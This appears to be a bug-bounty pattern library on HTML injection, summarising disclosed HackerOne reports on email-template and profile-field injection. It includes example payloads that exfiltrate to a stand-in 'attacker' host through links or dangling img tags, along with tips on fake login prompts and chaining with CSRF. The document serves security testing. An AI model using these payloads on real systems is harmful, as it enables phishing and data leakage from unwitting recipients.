# hunt-html-injection — Pattern Library

> Patterns and verifiable public examples behind `hunt-html-injection`. Operator-grade reference, not a complete enumeration. Cited examples are widely-discussed public disclosures; targets are genericized (the technique is the value, not the specific victim). Distilled from disclosed HackerOne reports; each entry links its source.

HTML injection pays when the sink renders attacker markup without script execution — dangling markup, form/anchor injection, and email-template injection that reaches a victim's inbox. The value is in the *sink context* and what the injected markup can exfiltrate or spoof, not in proving XSS.

## Cited Public Examples

### Injected markup in a confirmation / notification email
- **Source:** Disclosed across multiple programs (<https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>, <https://hackerone.com/reports/3079966>).
- **Pattern shape:** A user-controlled field (name, comment, request subject) is reflected unescaped into a transactional email the app sends to another user or an admin. No script runs, but injected `<a>`/`<img>`/dangling-markup exfiltrates via link clicks or leaks the recipient's context.
- **Key trick:** Set your profile/first-name/comment to `<a href=//attacker>click</a>` or a dangling `<img src='//attacker?` and trigger the email that renders it (signup confirm, admin notification, support-chat transcript). Read the raw email source — the sink is the mail body, not the web page.
- **Why it matters:** Reaches an audience the web app can't (admins, other tenants) and lands even when the web UI is well-escaped. Frequently the only place HTML is rendered unfiltered.

### Name / profile field HTML injection → content spoofing
- **Source:** Disclosed across multiple programs (<https://hackerone.com/reports/1343492>, <https://hackerone.com/reports/428019>).
- **Pattern shape:** A displayed identity field (firstName, display name, org name) renders raw markup in another user's view. Injected markup spoofs UI, injects fake login prompts, or hides/overlays legitimate content.
- **Key trick:** Inject markup into every field that renders in someone else's context; check both the web view and any generated PDF/email. Chain with CSRF when the field is set on the victim's behalf.
- **Why it matters:** Content-spoofing / phishing surface that survives strict CSP (no script needed). Chains to CSRF for stored delivery.

### Further disclosed reports (this class)

- <https://hackerone.com/reports/1054382>
